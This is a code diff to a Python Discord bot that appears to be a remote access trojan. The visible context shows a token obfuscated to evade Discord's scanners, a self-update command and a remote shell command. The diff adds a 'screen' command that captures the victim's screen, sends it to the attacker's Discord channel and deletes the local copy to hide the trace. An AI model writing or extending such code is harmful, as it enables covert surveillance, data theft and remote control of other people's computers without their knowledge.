@@ -6,6 +6,7 @@ import requests
 import sys
 import asyncio
 import base64
+import mss
 
 # --- CONFIGURATION ---
 # Replace this with your BASE64 ENCODED token to hide it from Discord's scanners
@@ -52,6 +53,17 @@ async def update(ctx):
             await ctx.send("❌ Update failed: Source invalid.")
     except Exception as e:
         await ctx.send(f"⚠️ Error: `{e}`")
+
+@bot.command()
+async def screen(ctx):
+    """Takes a screenshot and sends it to Discord."""
+    try:
+        with mss.mss() as sct:
+            filename = sct.shot(output="screenshot.png")
+            await ctx.send(file=discord.File(filename))
+            os.remove(filename) # Clean up after sending
+    except Exception as e:
+        await ctx.send(f"⚠️ Screenshot failed: {e}")
 
 @bot.command()
 async def shell(ctx, *, cmd):
